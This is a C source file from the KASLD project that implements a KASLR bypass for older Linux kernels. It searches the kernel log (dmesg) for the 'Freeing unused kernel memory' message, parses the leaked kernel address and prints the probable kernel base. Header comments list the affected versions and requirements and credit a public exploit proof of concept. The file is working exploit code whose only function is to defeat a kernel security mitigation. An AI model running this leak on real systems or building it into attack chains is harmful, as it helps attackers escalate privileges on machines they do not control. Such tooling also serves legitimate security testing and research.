// This file is part of KASLD - https://github.com/bcoles/kasld
//
// free_reserved_area() dmesg KASLR bypass for SMP kernels.
//
// x86:
// [    0.985903] Freeing unused kernel memory: 872K (c19b4000 - c1a8e000)
// x86_64:
// [    0.872873] Freeing unused kernel memory: 1476K (ffffffff81f41000 - ffffffff820b2000)
// arm64:
// [    2.804317] Freeing initrd memory: 16776K (ffff80005745b000 - ffff8000584bd000)
// ppc64:
// [    2.950991] Freeing unused kernel memory: 960K (c000000000920000 - c000000000a10000)
//
// free_reserved_area() leak was removed in kernel v4.10-rc1 on 2016-10-26:
// https://github.com/torvalds/linux/commit/adb1fe9ae2ee6ef6bc10f3d5a588020e7664dfa7
//
// Mostly taken from original code by xairy:
// https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
//
// References:
// https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long get_kernel_addr_dmesg_free_reserved_area() {
  char *syslog;
  char *endptr;
  char *substr;
  char *line_buf;
  char *addr_buf;
  const char *needle = "Freeing unused kernel memory";
  int size;
  unsigned long addr = 0;

  printf("[.] searching for free_reserved_area() info ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  substr = strstr(syslog, needle);
  if (substr == NULL)
    return 0;

  line_buf = strtok(substr, "\n");
  if (line_buf == NULL)
    return 0;

  /* Freeing unused kernel memory: 1476K (ffffffff81f41000 - ffffffff820b2000) */
  // printf("%s\n", line_buf);

  addr_buf = strstr(line_buf, "(");
  if (addr_buf == NULL)
    return 0;

  addr = strtoul(&addr_buf[1], &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main() {
  unsigned long addr = get_kernel_addr_dmesg_free_reserved_area();
  if (!addr)
    return 1;

  printf("leaked __init_begin: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  return 0;
}
